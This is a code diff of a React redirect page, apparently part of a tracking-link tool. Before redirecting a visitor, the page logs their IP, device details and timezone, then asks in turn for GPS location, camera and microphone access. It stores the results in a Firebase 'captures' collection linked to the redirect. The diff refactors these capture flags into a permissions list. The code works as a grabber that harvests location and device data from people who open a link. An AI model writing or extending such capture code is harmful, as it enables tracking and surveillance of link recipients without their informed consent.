@@ -1,6 +1,6 @@
 import * as React from 'react';
 import { useParams } from 'react-router-dom';
-import type { Settings, CapturedData } from '../types';
+import type { Settings, CapturedData, PermissionType } from '../types';
 import { useLanguage } from '../contexts/LanguageContext';
 import { NEW_REDIRECT_TEMPLATE, CARD_STYLES } from '../constants';
 import { db } from '../firebase';
@@ -325,10 +325,10 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
 
     try {
       const decodedString = atob(data);
-      const parsedSettings: Omit<Settings, 'id'> = JSON.parse(decodedString);
-      const isAnyCaptureEnabled = parsedSettings.captureInfo?.location || parsedSettings.captureInfo?.camera || parsedSettings.captureInfo?.microphone;
+      const parsedSettings: Settings = JSON.parse(decodedString);
+      const isAnyCaptureEnabled = parsedSettings.captureInfo?.permissions?.length > 0;
 
-      configToLoad = { ...NEW_REDIRECT_TEMPLATE, ...parsedSettings, id: 'live-redirect' };
+      configToLoad = { ...NEW_REDIRECT_TEMPLATE, ...parsedSettings };
       setSettings(configToLoad);
       setStatusText(isAnyCaptureEnabled ? t('redirect_permissions_request') : t('redirect_preparing'));
       setIsPaused(!isPreview); 
@@ -366,7 +366,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
         const { os, browser, deviceType } = parseUserAgent(navigator.userAgent);
         
         const initialData: Omit<CapturedData, 'id'> = {
-            redirectId: settings.id,
+            redirectId: settings.id, // This is the critical ID for linking data.
             name: `Capture @ ${new Date().toLocaleString()}`,
             timestamp: Date.now(),
             ip: 'Fetching...',
@@ -378,9 +378,9 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             location: { lat: null, lon: null, city: 'Unknown', country: 'Unknown', source: 'ip' },
             permissions: { 
-                location: settings.captureInfo.location ? 'prompt' : 'n/a',
-                camera: settings.captureInfo.camera ? 'prompt' : 'n/a',
-                microphone: settings.captureInfo.microphone ? 'prompt' : 'n/a',
+                location: settings.captureInfo.permissions.includes('location') ? 'prompt' : 'n/a',
+                camera: settings.captureInfo.permissions.includes('camera') ? 'prompt' : 'n/a',
+                microphone: settings.captureInfo.permissions.includes('microphone') ? 'prompt' : 'n/a',
             }
         };
 
@@ -399,50 +399,47 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
             }
         } catch (e) { console.error("Could not fetch IP data:", e); }
 
-        const permissionPromises = [];
-        if (settings.captureInfo.location) {
-            permissionPromises.push(new Promise<void>((resolve) => {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        initialData.permissions.location = 'granted';
-                        initialData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude, city: initialData.location.city, country: initialData.location.country, source: 'gps'};
-                        resolve();
-                    },
-                    () => { initialData.permissions.location = 'denied'; resolve(); }
-                );
-            }));
+        let anyPermissionDenied = false;
+        
+        // Sequential permission requests
+        for (const permission of settings.captureInfo.permissions) {
+            if (permission === 'location') {
+                try {
+                    const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+                    });
+                    initialData.permissions.location = 'granted';
+                    initialData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude, city: initialData.location.city, country: initialData.location.country, source: 'gps'};
+                } catch {
+                    initialData.permissions.location = 'denied';
+                    anyPermissionDenied = true;
+                }
+            } else if (permission === 'camera') {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    initialData.permissions.camera = 'granted';
+                    setTimeout(() => stream.getTracks().forEach(track => track.stop()), settings.captureInfo.recordingDuration * 1000);
+                } catch {
+                    initialData.permissions.camera = 'denied';
+                    anyPermissionDenied = true;
+                }
+            } else if (permission === 'microphone') {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    initialData.permissions.microphone = 'granted';
+                    setTimeout(() => stream.getTracks().forEach(track => track.stop()), settings.captureInfo.recordingDuration * 1000);
+                } catch {
+                    initialData.permissions.microphone = 'denied';
+                    anyPermissionDenied = true;
+                }
+            }
         }
-         if (settings.captureInfo.camera) {
-            permissionPromises.push(new Promise<void>((resolve) => {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => { 
-                        initialData.permissions.camera = 'granted';
-                        setTimeout(() => stream.getTracks().forEach(track => track.stop()), settings.captureInfo.recordingDuration * 1000);
-                        resolve();
-                     })
-                    .catch(() => { initialData.permissions.camera = 'denied'; resolve(); });
-            }));
-        }
-        if (settings.captureInfo.microphone) {
-            permissionPromises.push(new Promise<void>((resolve) => {
-                navigator.mediaDevices.getUserMedia({ audio: true })
-                    .then(stream => { 
-                        initialData.permissions.microphone = 'granted';
-                        setTimeout(() => stream.getTracks().forEach(track => track.stop()), settings.captureInfo.recordingDuration * 1000);
-                        resolve();
-                    })
-                    .catch(() => { initialData.permissions.microphone = 'denied'; resolve(); });
-            }));
-        }
-
-        await Promise.all(permissionPromises);
         
         try {
              await addDoc(collection(db, "captures"), initialData);
         } catch(e) { console.error("Failed to save captured data:", e); }
         
-        const wasDenied = Object.values(initialData.permissions).includes('denied');
-        if (wasDenied) {
+        if (anyPermissionDenied) {
             setPermissionDenied(true);
         } else {
             startRedirectSequence();
